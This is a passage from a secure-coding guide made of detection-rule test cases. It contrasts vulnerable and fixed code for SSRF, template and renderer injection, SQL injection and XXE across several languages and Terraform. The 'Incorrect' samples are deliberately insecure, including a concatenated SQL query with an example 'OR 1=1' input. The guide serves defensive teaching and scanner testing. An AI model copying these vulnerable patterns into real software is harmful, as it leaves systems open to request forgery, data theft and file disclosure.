  await page.on('onResourceRequested', function(requestData) {
    console.info('Requesting', requestData.url);
  });

  // ruleid: phantom-injection
  const status = await page.open(input());

  const content = await page.property('content');
  console.log(content);

  await instance.exit();
})();

(async function(userInput) {
  const instance = await phantom.create();
  const page = await instance.createPage();

  // ruleid: phantom-injection
  const status = await page.property('content', input());

  // ruleid: phantom-injection
  await page.setContent(userInput);

  // ruleid: phantom-injection
  await page.evaluateJavaScript(userInput);

  await instance.exit();
})();
```

**Correct: Phantom.js - hardcoded URLs**

```javascript
const phantom = require('phantom');

(async function() {
  const instance = await phantom.create();
  const page = await instance.createPage();

  // ok: phantom-injection
  const status = await page.open('https://stackoverflow.com/');

  // ok: phantom-injection
  var html = '<html>123</html>'
  const status = await page.property('content', html);

  // ok: phantom-injection
  var url = 'https://stackoverflow.com/'
  const status = await page.openUrl(url, {}, {});

  await instance.exit();
})();
```

**Incorrect: wkhtmltopdf - injection**

```javascript
const wkhtmltopdf = require('wkhtmltopdf')

// ruleid: wkhtmltopdf-injection
wkhtmltopdf(input(), { output: 'vuln.pdf' })

function test(userInput) {
  // ruleid: wkhtmltopdf-injection
  return wkhtmltopdf(userInput, { output: 'vuln.pdf' })
}
```

**Correct: wkhtmltopdf - hardcoded content**

```javascript
const wkhtmltopdf = require('wkhtmltopdf')

// ok: wkhtmltopdf-injection
wkhtmltopdf('<html><html/>', { output: 'vuln.pdf' })

function okTest(userInput) {
   var html = '<html><html/>';
   // ok: wkhtmltopdf-injection
   return wkhtmltopdf(html, { output: 'vuln.pdf' })
}
```

**Incorrect: wkhtmltoimage - injection**

```javascript
var wkhtmltoimage = require('wkhtmltoimage')

// ruleid: wkhtmltoimage-injection
wkhtmltoimage.generate(input(), { output: 'vuln.jpg' })

function test(userInput) {
    // ruleid: wkhtmltoimage-injection
    wkhtmltoimage.generate(userInput, { output: 'vuln.jpg' })
}
```

**Correct: wkhtmltoimage - hardcoded content**

```javascript
var wkhtmltoimage = require('wkhtmltoimage')

const html = '<html></html>'
// ok: wkhtmltoimage-injection
wkhtmltoimage.generate(html, { output: 'vuln.jpg' })
```

**Incorrect: Apollo + Axios - SSRF**

```javascript
module.exports = {
    Query: {
        requestStatus(parent, args, context, info)
        {
            url = args.url
            const axios = require('axios');

            async function getStatus(url) {
                try {
                  // ruleid: apollo-axios-ssrf
                  const response = await axios.request(url);
                  console.log(response);
                  var s = response.status;
                } catch (error) {
                  console.error(error);
                  var s = error.code;
                }
                return s;
              }
            return getStatus(url);
        }
    }
};
```

---

**Incorrect: tainted URL host via fmt.Sprintf**

```go
package main

import (
	"fmt"
	"net/http"
)

func handlerIndexFmt(w http.ResponseWriter, r *http.Request) {
	client := &http.Client{}

	if r.Method == "POST" && r.URL.Path == "/api" {
		url := fmt.Sprintf("https://%v/api", r.URL.Query().Get("proxy"))

		// ruleid: tainted-url-host
		resp, err := client.Post(url, "application/json", r.Body)

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()
	}
}

func handlerBadFmt(w http.ResponseWriter, r *http.Request) {
	urls, ok := r.URL.Query()["url"]
	if !ok {
		http.Error(w, "url missing", 500)
		return
	}

	url := fmt.Sprintf("//%s/path", urls[0])

	// ruleid: tainted-url-host
	resp, err := http.Get(url)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	client := &http.Client{}

	// ruleid: tainted-url-host
	req2, err := http.NewRequest("GET", url, nil)
	_, err2 := client.Do(req2)
}
```

**Correct: fixed host, user data in path only**

```go
package main

import (
	"fmt"
	"net/http"
)

func handlerOkFmt(w http.ResponseWriter, r *http.Request) {
	client := &http.Client{}

	if r.Method == "POST" && r.URL.Path == "/api" {
		url := fmt.Printf("https://example.com/%v", r.URL.Query().Get("proxy"))

		// ok: tainted-url-host
		resp, err := client.Post(url, "application/json", r.Body)

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()
	}
}

func handlerOk(w http.ResponseWriter, r *http.Request) {
	// ok: tainted-url-host
	_, err3 := http.Get("https://semgrep.dev")
	if err3 != nil {
		http.Error(w, err3.Error(), 500)
		return
	}
}
```

**Incorrect: tainted URL host via string concatenation**

```go
package main

import (
	"net/http"
)

func handlerIndexAdd(w http.ResponseWriter, r *http.Request) {
	client := &http.Client{}

	if r.Method == "POST" && r.URL.Path == "/api" {
		url := "https://" + r.URL.Query().Get("proxy") + "/api"

		// ruleid: tainted-url-host
		resp, err := client.Post(url, "application/json", r.Body)

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()
	}
}

func handlerBadAdd(w http.ResponseWriter, r *http.Request) {
	urls, ok := r.URL.Query()["url"]
	if !ok {
		http.Error(w, "url missing", 500)
		return
	}

	url := urls[0]

	// ruleid: tainted-url-host
	resp, err := http.Get(url)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	client := &http.Client{}

	// ruleid: tainted-url-host
	req2, err := http.NewRequest("GET", r.URL.Path, nil)
	_, err2 := client.Do(req2)
}
```

**Correct: user data only in path portion**

```go
package main

import (
	"net/http"
)

func handlerOkAdd(w http.ResponseWriter, r *http.Request) {
	client := &http.Client{}

	if r.Method == "POST" && r.URL.Path == "/api" {
		// ok: tainted-url-host
		resp, err := client.Post("https://example.com/"+r.URL.Query().Get("proxy"), "application/json", r.Body)

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()
	} else {
		proxy := r.URL.Query()["proxy"]
		url := "https://example.com/" + proxy
		// ok: tainted-url-host
		resp, err := client.Post(url, "application/json", r.Body)
	}
}
```

---

**Incorrect: Spring - tainted URL host**

```java
package org.sasanlabs.service.vulnerability.ssrf;

import java.net.URL;
import java.net.URLConnection;
import org.springframework.web.bind.annotation.RequestParam;

@VulnerableAppRestController(descriptionLabel = "SSRF_VULNERABILITY", value = "SSRFVulnerability")
public class SSRFVulnerability {

    @VulnerableAppRequestMapping(value = LevelConstants.LEVEL_1, htmlTemplate = "LEVEL_1/SSRF")
    public ResponseEntity<GenericVulnerabilityResponseBean<byte[]>> getVulnerablePayloadLevel1(
            @RequestParam("imageurl") String urlImage) {
        try {
            // ruleid: tainted-url-host
            URL u = new URL(urlImage);
            URLConnection urlConnection = u.openConnection();
            byte[] bytes;
            try (InputStream in = urlConnection.getInputStream()) {
                bytes = StreamUtils.copyToByteArray(urlConnection.getInputStream());
            }
            return new ResponseEntity<>(
                    new GenericVulnerabilityResponseBean<>(bytes, true), HttpStatus.OK);
        } catch (Exception e) {
            LOGGER.error("Error fetching URL {}", urlImage, e);
        }
        return new ResponseEntity<>(HttpStatus.BAD_REQUEST);
    }
}
```

**Correct: Java - hardcoded host, user data in path**

```java
@RestController
@RequestMapping("/user03")
public class User03Controller {

    @Autowired
    private RestTemplate restTemplate;

    @GetMapping("/get")
    public UserDTO get(@RequestParam("id") Integer id) {
        // ok: tainted-url-host
        String url = String.format("http://%s/user/get?id=%d", "demo-provider", id);
        return restTemplate.getForObject(url, UserDTO.class);
    }

    @PostMapping("/add")
    public Integer add(UserAddDTO addDTO) {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        String body = JSON.toJSONString(addDTO);
        HttpEntity<String> entity = new HttpEntity<>(body, headers);
        // ok: tainted-url-host
        String url = String.format("http://%s/user/add", "demo-provider");
        return restTemplate.postForObject(url, entity, Integer.class);
    }
}
```

---

**Incorrect: WebRequest with user-controlled URL**

```csharp
using System.Net.WebRequest;
using System.Uri;

namespace Ssrf
{
    public class Ssrf
    {
        // ruleid: ssrf
        public void WebRequest(string host)
        {
            try
            {
                WebRequest webRequest = WebRequest.Create(host);
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }

        // ruleid: ssrf
        public void WebRequestWithStringConcatenation(string host)
        {
            String baseUrl = "constant" + host;
            WebRequest webRequest = WebRequest.Create(baseUrl);
        }

        // ruleid: ssrf
        public void WebRequestWithUri(string host)
        {
            Uri uri = new Uri(host);
            WebRequest webRequest = WebRequest.Create(uri);
        }
    }
}
```

**Correct: WebRequest with hardcoded URL**

```csharp
using System.Net.WebRequest;
using System.Uri;

namespace Ssrf
{
    public class Ssrf
    {
        // ok: ssrf
        public void WebRequest(string host)
        {
            try
            {
                WebRequest webRequest = WebRequest.Create("constant");
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }

        // ok: ssrf
        public void WebRequestWithStringConcatenation(string host)
        {
            String baseUrl = "constant";
            WebRequest webRequest = WebRequest.Create(baseUrl);
        }

        // ok: ssrf
        public void WebRequestWithUri(string host)
        {
            Uri uri = new Uri("constant");
            WebRequest webRequest = WebRequest.Create(uri);
        }
    }
}
```

**Incorrect: HttpClient with user-controlled URL**

```csharp
using System.Net.Http;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ruleid: ssrf
        public void HttpClientAsync(string host)
        {
            HttpClient client = new HttpClient();
            try
            {
                HttpResponseMessage response = client.GetAsync(host).Result;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }

        // ruleid: ssrf
        public void HttpClientAsyncWithUri(string host)
        {
            Uri uri = new Uri(host);
            HttpClient client = new HttpClient();
            try
            {
                HttpResponseMessage response = client.GetAsync(uri).Result;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }
    }
}
```

**Correct: HttpClient with hardcoded URL**

```csharp
using System.Net.Http;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ok: ssrf
        public void HttpClientAsync(string host)
        {
            HttpClient client = new HttpClient();
            try
            {
                HttpResponseMessage response = client.GetAsync("constant").Result;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }

        // ok: ssrf
        public void HttpClientAsyncWithUri(string host)
        {
            Uri uri = new Uri("constant");
            HttpClient client = new HttpClient();
            try
            {
                HttpResponseMessage response = client.GetAsync(uri).Result;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }
    }
}
```

**Incorrect: WebClient with user-controlled URL**

```csharp
using System.Net;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ruleid: ssrf
        public string WebClient(string host)
        {
            string result = "";
            try
            {
                WebClient client = new WebClient();
                Stream data = client.OpenRead(host);
                StreamReader reader = new StreamReader(data);
                result = reader.ReadToEnd();
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
            return result;
        }

        // ruleid: ssrf
        public string WebClientDownloadString(string host)
        {
            string result = "";
            try
            {
                WebClient client = new WebClient();
                Stream data = client.DownloadString(host);
                StreamReader reader = new StreamReader(data);
                result = reader.ReadToEnd();
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
            return result;
        }
    }
}
```

**Correct: WebClient with hardcoded URL**

```csharp
using System.Net;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ok: ssrf
        public string WebClient(string host)
        {
            string result = "";
            try
            {
                WebClient client = new WebClient();
                Stream data = client.OpenRead("constant");
                StreamReader reader = new StreamReader(data);
                result = reader.ReadToEnd();
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
            return result;
        }

        // ok: ssrf
        public string WebClientDownloadString(string host)
        {
            string result = "";
            try
            {
                WebClient client = new WebClient();
                Stream data = client.DownloadString("constant");
                StreamReader reader = new StreamReader(data);
                result = reader.ReadToEnd();
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
            return result;
        }
    }
}
```

**Incorrect: RestClient with user-controlled URL**

```csharp
using RestSharp;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ruleid: ssrf
        public void RestClientGet(string host)
        {
            try
            {
                RestClient client = new RestClient(host);
                var request = new RestRequest("/");
                var response = client.Get(request);
                result = response.Content;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }
    }
}
```

**Correct: RestClient with hardcoded URL**

```csharp
using RestSharp;

namespace ServerSideRequestForgery
{
    public class Ssrf
    {
        // ok: ssrf
        public void RestClientGet(string host)
        {
            try
            {
                RestClient client = new RestClient("constant");
                var request = new RestRequest("/");
                var response = client.Get(request);
                result = response.Content;
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
        }
    }
}
```

---

**Incorrect: Play WSClient - SSRF**

```scala
package controllers

import javax.inject._
import play.api.libs.ws._
import scala.concurrent.Future

object Smth {
  def call1(wsClient: WSClient, url: String): Future[Unit] = {
    // ruleid: webservice-ssrf
    wsClient.url(url).get().map { response =>
      val statusText: String = response.statusText
      println(s"Got a response $statusText")
    }
  }
}

@Singleton
class HomeController @Inject()(
  ws: WSClient,
  val controllerComponents: ControllerComponents,
  implicit val ec: ExecutionContext
) extends BaseController {

  def req1(url: String) = Action.async { implicit request: Request[AnyContent] =>
    // ruleid: webservice-ssrf
    val futureResponse = ws.url(url).get()
    futureResponse.map { response =>
      Ok(s"it works: ${response.statusText}")
    }
  }
}
```

**Correct: Play WSClient - hardcoded URL**

```scala
package controllers

import javax.inject._
import play.api.libs.ws._
import scala.concurrent.Future

object Smth {
  def call2(wsClient: WSClient): Future[Unit] = {
    // ok: webservice-ssrf
    wsClient.url("https://www.google.com").get().map { response =>
      val statusText: String = response.statusText
      println(s"Got a response $statusText")
    }
  }
}

@Singleton
class HomeController @Inject()(
  ws: WSClient,
  val controllerComponents: ControllerComponents,
  implicit val ec: ExecutionContext
) extends BaseController {

  def req2(url: String) = Action.async { implicit request: Request[AnyContent] =>
    // ok: webservice-ssrf
    val futureResponse = ws.url("https://www.google.com").get()
    futureResponse.map { response =>
      Ok(s"it works: ${url}")
    }
  }
}
```

**Incorrect: Scala IO Source - SSRF**

```scala
package controllers

import scala.io.{Codec, Source}

object Smth {
  def call1(request_url: String) = {
    // ruleid: io-source-ssrf
    val html = Source.fromURI(request_url)
    val data = html.mkString
    data
  }
}

object FooBar {
  def call1(request_url: String, codec: Codec) = {
    // ruleid: io-source-ssrf
    val res = Source.fromURL(request_url)(codec).mkString
    res
  }
}
```

**Correct: Scala IO Source - hardcoded URL**

```scala
package controllers

import scala.io.{Codec, Source}

object Smth {
  def call2() = {
    // ok: io-source-ssrf
    val html = Source.fromURI("https://www.google.com")
    val data = html.mkString
    data
  }
}

object FooBar {
  def call2() = {
    // ok: io-source-ssrf
    val res = Source.fromURL("https://www.google.com")(codec).mkString
    res
  }
}
```

**Incorrect: Dispatch HTTP - SSRF**

```scala
package controllers

import dispatch._
import Defaults._

object Smth {
  def call1(request_url: String): Future[Unit] = {
    // ruleid: dispatch-ssrf
    val req = url(request_url)
    val data = Http.default(req OK as.String)
    data
  }
}

object FooBar {
  def call1(request_url: String): Future[Unit] = {
    // ruleid: dispatch-ssrf
    val request = url(request_url).POST.setHeader("Content-Type", "application/json")
    val res = Http(request OK as.String)
    res
  }
}
```

**Correct: Dispatch HTTP - hardcoded URL**

```scala
package controllers

import dispatch._
import Defaults._

object Smth {
  def call2(): Future[Unit] = {
    // ok: dispatch-ssrf
    val req = url("https://www.google.com")
    val data = Http.default(req OK as.String)
    data
  }
}

object FooBar {
  def call2(): Future[Unit] = {
    // ok: dispatch-ssrf
    val request = url("https://www.google.com").POST.setHeader("Content-Type", "application/json")
    val res = Http(request OK as.String)
    res
  }
}
```

**Incorrect: Scalaj HTTP - SSRF**

```scala
package controllers

import scalaj.http.{Http, Token}

object Smth {
  def call1(url: String): Future[Unit] = {
    // ruleid: scalaj-http-ssrf
    val response: HttpResponse[String] = Http(url).param("q","monkeys").asString
    response.body
  }
}

object FooBar {
  def call1(url: String): Future[Unit] = {
    // ruleid: scalaj-http-ssrf
    val request = Http(url).postForm(Seq("name" -> "jon", "age" -> "29"))
    request.asString
  }
}
```

**Correct: Scalaj HTTP - hardcoded URL**

```scala
package controllers

import scalaj.http.{Http, Token}

object Smth {
  def call2(): Future[Unit] = {
    // ok: scalaj-http-ssrf
    val response: HttpResponse[String] = Http("https://www.google.com").param("q","monkeys").asString
    response.body
  }
}

object FooBar {
  def call2(): Future[Unit] = {
    // ok: scalaj-http-ssrf
    val request = Http("https://www.google.com").postForm(Seq("name" -> "jon", "age" -> "29"))
    request.asString
  }
}
```

---

**Incorrect: curl with user input**

```php
<?php
    function test1(){
        //ruleid: php-ssrf
        $ch = curl_init($_GET['r']);
    }

    function test2(){
        //ruleid: php-ssrf
        $url = $_GET['r'];
        $ch = curl_init($url);
    }

    function test3(){
        $ch = curl_init();
        //ruleid: php-ssrf
        curl_setopt($ch, CURLOPT_URL, $_POST['image_url']);
    }

    function test4(){
        $ch = curl_init();
        //ruleid: php-ssrf
        $url = $_GET['r'];
        curl_setopt($ch, CURLOPT_URL, $url);
    }
?>
```

**Incorrect: fopen/file_get_contents with user input**

```php
<?php
    function test5(){
        //ruleid: php-ssrf
        $url = $_GET['r'];
        $file = fopen($url, 'rb');
    }

    function test6(){
        //ruleid: php-ssrf
        $file = fopen($_POST['r'], 'rb');
    }

    function test7(){
        //ruleid: php-ssrf
        $url = $_POST['r'];
        $file = file_get_contents($url);
    }

    function test8(){
        //ruleid: php-ssrf
        $file = file_get_contents($_POST['r']);
    }
?>
```

**Correct: hardcoded URLs**

```php
<?php
    function test9(){
        //ok: php-ssrf
        $file = file_get_contents("index.php");
    }

    function test10(){
        //ok: php-ssrf
        $url = $_POST['r'];
        $file = fopen("/tmp/test.txt", 'rb');
    }
?>
```

**Incorrect: tainted URL host**

```php
<?php

function test1() {
    // ruleid: tainted-url-host
    $url = 'https://'.$_GET['url'].'/foobar';
    $info = make_request($url);
    return $info;
}

function test2() {
    $part = $_POST['url'];
    // ruleid: tainted-url-host
    $url = "https://$part/foobar";
    $info = make_request($url);
    return $info;
}

function test3() {
    // ruleid: tainted-url-host
    $url = "https://{$_REQUEST['url']}/foobar";
    $info = make_request($url);
    return $info;
}

function test4() {
    // ruleid: tainted-url-host
    $url = sprintf('https://%s/%s/', $_COOKIE['foo'], $bar);
    $info = make_request($url);
    return $info;
}
```

**Correct: fixed host, user data in path only**

```php
<?php

function test1() {
    // ok: tainted-url-host
    $url = 'https://www.google.com/'.$_GET['url'].'/foobar';
    $info = make_request($url);
    return $info;
}

function test3() {
    // ok: tainted-url-host
    $url = "https://www.google.com/{$_REQUEST['url']}/foobar";
    $info = make_request($url);
    return $info;
}
```

**Incorrect: tainted filename leading to SSRF**

```php
<?php

$tainted = $_GET["tainted"];
// ruleid: tainted-filename
hash_file('sha1', $tainted);

// ruleid: tainted-filename
file($tainted);

// ruleid: tainted-filename
file(dirname($tainted));
```

**Correct: sanitized filename**

```php
<?php

$tainted = $_GET["tainted"];

// ok: tainted-filename
hash_file($tainted, 'file.txt');

// Sanitized
// ok: tainted-filename
file(basename($tainted));
```

---

**Incorrect: Rails - tainted HTTP request**

```ruby
require 'net/http'

def foo
  url = params[:url]
  # ruleid: avoid-tainted-http-request
  Net::HTTP.get(url, "/index.html")

  # ruleid: avoid-tainted-http-request
  Net::HTTP.get_response(params[:url])

  uri = URI(params[:url])
  # ruleid: avoid-tainted-http-request
  Net::HTTP.post(uri)

  # ruleid: avoid-tainted-http-request
  Net::HTTP.post_form(URI(params[:url]))

  uri = URI(params[:server])
  # ruleid: avoid-tainted-http-request
  req = Net::HTTP::Get.new uri

  # ruleid: avoid-tainted-http-request
  Net::HTTP.start(uri.host, uri.port) do |http|
    # ruleid: avoid-tainted-http-request
    req = Net::HTTP::Get.new uri
    resp = http.request request
  end

  # ruleid: avoid-tainted-http-request
  Net::HTTP::Get.new(params[:url])

  # ruleid: avoid-tainted-http-request
  Net::HTTP::Post.new(URI(params[:url]))
end
```

**Correct: Ruby - hardcoded URLs**

```ruby
require 'net/http'

def foo
  # ok: avoid-tainted-http-request
  Net::HTTP.get("example.com", "/index.html")

  uri = URI("example.com/index.html")
  # ok: avoid-tainted-http-request
  Net::HTTP::Get.new(uri)
end
```

---

**Incorrect: AWS EC2 IMDSv1 optional - allows SSRF to metadata**

```hcl
resource "aws_instance" "test-instance-bad-http-tokens-optional" {
  ami = "ami-0d5eff06f840b45e9"

  metadata_options {
    http_endpoint = "enabled"
    # ruleid: ec2-imdsv1-optional
    http_tokens = "optional"
  }
}

# ruleid: ec2-imdsv1-optional
resource "aws_instance" "test-instance-bad-no-metadata-options" {
  ami = "ami-0d5eff06f840b45e9"
}

# ruleid: ec2-imdsv1-optional
resource "aws_instance" "test-instance-bad-v3-http-tokens-default-optional" {
  ami = "ami-0d5eff06f840b45e9"
  metadata_options {
    http_endpoint = "enabled"
  }
}
```

**Correct: AWS EC2 IMDSv2 required - mitigates SSRF to metadata**

```hcl
# ok: ec2-imdsv1-optional
resource "aws_instance" "test-instance-good" {
  ami = "ami-0d5eff06f840b45e9"
  metadata_options {
    http_endpoint = "enabled"
    http_tokens = "required"
  }
}
```

---

**References:**

- CWE-918: Server-Side Request Forgery (SSRF)

- [OWASP Top 10 A10:2021 - Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29)

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

- [OWASP SSRF Attacks](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

- [AWS EC2 Instance Metadata and SSRF](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service)

- [CWE-918 Definition](https://cwe.mitre.org/data/definitions/918.html)

### 0.19 Prevent SQL Injection

**Impact: CRITICAL (Data leakage)**

Never concatenate or use format strings to execute sql, always use parameterized queries.

**Incorrect: vulnerable SQL - Node.js / TypeScript**

```typescript
// Vulnerable: concatenates user input directly into SQL
import { Pool } from 'pg'
const pool = new Pool()

export async function handler(req: any, res: any) {
  const userId = req.query.id // attacker can supply "1 OR 1=1"
  const sql = `SELECT id, username, email FROM users WHERE id = ${userId}`
  const { rows } = await pool.query(sql)
  res.json(rows)
}
```

**Correct: parameterized query - Node.js / TypeScript**

```typescript
// Safe: use parameterized queries to avoid SQL injection
import { Pool } from 'pg'
const pool = new Pool()

export async function handler(req: any, res: any) {
  const userId = req.query.id
  const sql = 'SELECT id, username, email FROM users WHERE id = $1'
  const { rows } = await pool.query(sql, [userId])
  res.json(rows)
}
```

### 0.20 Prevent XML External Entity (XXE) Injection

**Impact: CRITICAL (File disclosure, SSRF, denial of service)**

XXE occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Attackers can access local files, perform SSRF, or cause DoS.

---

**Incorrect: vulnerable to XXE**

```java
class BadXMLInputFactory {
    public BadXMLInputFactory() {
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        // ruleid:xmlinputfactory-external-entities-enabled
        xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", true);
    }
}

class BadXMLInputFactory1 {
    public BadXMLInputFactory1() {
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        // ruleid:xmlinputfactory-external-entities-enabled
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true);
    }
}
```

**Correct: XXE disabled**

```java
class GoodXMLInputFactory {
    public GoodXMLInputFactory() {
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        // ok:xmlinputfactory-external-entities-enabled
        xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Semgrep Blog: XML Security in Java](https://semgrep.dev/blog/2022/xml-security-in-java)

- [Semgrep Java XXE Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/java-xxe/)

---

**Incorrect: vulnerable to XXE**

```java
class MaybeBadXMLInputFactory {
    public void foobar() {
        // ruleid:xmlinputfactory-possible-xxe
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
    }
}

class BadXMLInputFactory1 {
    public BadXMLInputFactory1() {
        // ruleid:xmlinputfactory-possible-xxe
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", true);
    }
}
```

**Correct: XXE disabled**

```java
class GoodXMLInputFactory {
    public void blah() {
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        // ok
        xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
    }
}

class GoodConstXMLInputFactory {
    public GoodConstXMLInputFactory() {
        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        // ok
        xmlInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP XXE Prevention Cheat Sheet - XMLInputFactory](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlinputfactory-a-stax-parser)

---

**Incorrect: vulnerable to XXE**

```java
class BadDocumentBuilderFactory{
    public void BadDocumentBuilderFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ruleid:documentbuilderfactory-disallow-doctype-decl-missing
        dbf.newDocumentBuilder();
    }

    public void BadDocumentBuilderFactory2() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("somethingElse", true);
        //ruleid:documentbuilderfactory-disallow-doctype-decl-missing
        dbf.newDocumentBuilder();
    }
}
```

**Correct: XXE disabled**

```java
class GoodDocumentBuilderFactory {
    public void GoodDocumentBuilderFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        //ok:documentbuilderfactory-disallow-doctype-decl-missing
        dbf.newDocumentBuilder();
    }

    public void GoodDocumentBuilderFactory2() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        //ok:documentbuilderfactory-disallow-doctype-decl-missing
        dbf.newDocumentBuilder();
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Apache Xerces Features](https://xerces.apache.org/xerces2-j/features.html)

- [Semgrep Java XXE Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/java-xxe/)

---

**Incorrect: vulnerable to XXE**

```java
class BadDocumentBuilderFactory{
    public void BadXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ruleid:documentbuilderfactory-disallow-doctype-decl-false
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
    }
}
```

**Correct: XXE disabled**

```java
class GoodDocumentBuilderFactory {
    public void GoodXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ok:documentbuilderfactory-disallow-doctype-decl-false
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Semgrep Blog: XML Security in Java](https://semgrep.dev/blog/2022/xml-security-in-java)

---

**Incorrect: vulnerable to XXE**

```java
class BadDocumentBuilderFactory{
    public void BadXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ruleid:documentbuilderfactory-external-general-entities-true
        dbf.setFeature("http://xml.org/sax/features/external-general-entities" , true);
    }
}

class BadSAXParserFactory{
    public void BadSAXParserFactory() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        //ruleid:documentbuilderfactory-external-general-entities-true
        spf.setFeature("http://xml.org/sax/features/external-general-entities" , true);
    }
}
```

**Correct: XXE disabled**

```java
class GoodDocumentBuilderFactory {
    public void GoodXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ok:documentbuilderfactory-external-general-entities-true
        dbf.setFeature("http://xml.org/sax/features/external-general-entities" , false);
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [SonarSource: Secure XML Processor](https://blog.sonarsource.com/secure-xml-processor)

---

**Incorrect: vulnerable to XXE**

```java
class BadDocumentBuilderFactory{
    public void BadXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ruleid:documentbuilderfactory-external-parameter-entities-true
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities" , true);
    }
}

class BadSAXParserFactory{
    public void BadSAXParserFactory() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        //ruleid:documentbuilderfactory-external-parameter-entities-true
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities" , true);
    }
}
```

**Correct: XXE disabled**

```java
class GoodDocumentBuilderFactory {
    public void GoodXMLInputFactory() throws  ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        //ok:documentbuilderfactory-external-parameter-entities-true
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities" , false);
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

